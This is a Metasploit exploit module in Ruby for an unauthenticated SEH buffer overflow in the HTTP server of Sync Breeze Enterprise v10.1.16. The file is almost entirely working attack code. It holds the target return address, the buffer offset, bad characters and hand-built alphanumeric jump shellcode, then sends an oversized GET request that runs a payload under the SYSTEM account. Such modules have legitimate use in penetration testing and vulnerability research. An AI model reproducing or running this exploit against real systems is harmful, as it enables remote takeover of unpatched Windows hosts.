##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SyncBreeze v10.1.16 SEH GET Overflow',
      'Description'    => %q{
          There exists an unauthenticated SEH based vulnerability in the HTTP
        server of Sync Breeze Enterprise v10.1.16, when sending a GET request
        with an excessive length it is possible for a malicious user to overwrite the
        SEH record and execute a payload that would run under the Windows NT AUTHORITY\SYSTEM account.

        The SEH record is overwritten with a "POP,POP,RET" pointer from the application
        library libspp.dll. This exploit has been successfully tested on Windows XP, 7 and
        10 (x86->x64). It should work against all versions of Windows and service packs.
      },

      'Author'         => 'wetw0rk',
      'License'        => MSF_LICENSE,
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'       => 800,
          'EncoderType' => "alpha_upper",
          'BadChars'    => "\x00\x0a\x0d"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows XP/7/10 (SyncBreez Enterprise v10.1.16)',
            { 'Ret'    => 0x1001C65C,
              'Offset' => 2495 
            }]
        ],
      'DisclosureDate' => 'October 11 2017',
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(80)])

  end

  def exploit
    connect

    print_status("Trying #{target.name}")

    # Make the JMP to the payload, else JMP into the A's acting as NOP's
    # Using AlphaNum technique learned from Mut's in OSCE (aka a legend)
    jumpcode = "\x25\x4a\x4d\x4e\x55"	# and    eax,0x554e4d4a
    jumpcode << "\x25\x35\x32\x31\x2a"	# and    eax,0x2a313235
    jumpcode << "\x2d\x37\x37\x37\x37"	# sub    eax,0x37373737
    jumpcode << "\x2d\x74\x74\x74\x74"	# sub    eax,0x74747474
    jumpcode << "\x2d\x55\x54\x55\x70"	# sub    eax,0x70555455
    jumpcode << "\x50"			# push   eax
    jumpcode << "\x25\x4a\x4d\x4e\x55"	# and    eax,0x554e4d4a
    jumpcode << "\x25\x35\x32\x31\x2a"	# and    eax,0x2a313235
    jumpcode << "\x2d\x2d\x76\x7a\x63"	# sub    eax,0x637a762d
    jumpcode << "\x2d\x2d\x76\x7a\x30"	# sub    eax,0x307a762d
    jumpcode << "\x2d\x25\x50\x7a\x30"	# sub    eax,0x307a5025
    jumpcode << "\x50"			# push   eax
    jumpcode << "\xff\xe4"		# jmp    esp
    # greetz to kluo, and abatchy17
    sploit = payload.encoded
    sploit << 'A' * (target['Offset'] - payload.encoded.length)
    sploit << "\x74\x06\x75\x06"
    sploit << [target.ret].pack('V')
    sploit << jumpcode
    sploit << 'A' * (9067 - (target['Offset'] + payload.encoded.length + 8 + jumpcode.length))

    send_request_cgi(
      'uri'        =>  '/' + sploit,
      'method'     =>  'GET',
      'host'       =>  '4.2.2.2',
      'connection' =>  'keep-alive'
    )

    handler
    disconnect
  end

end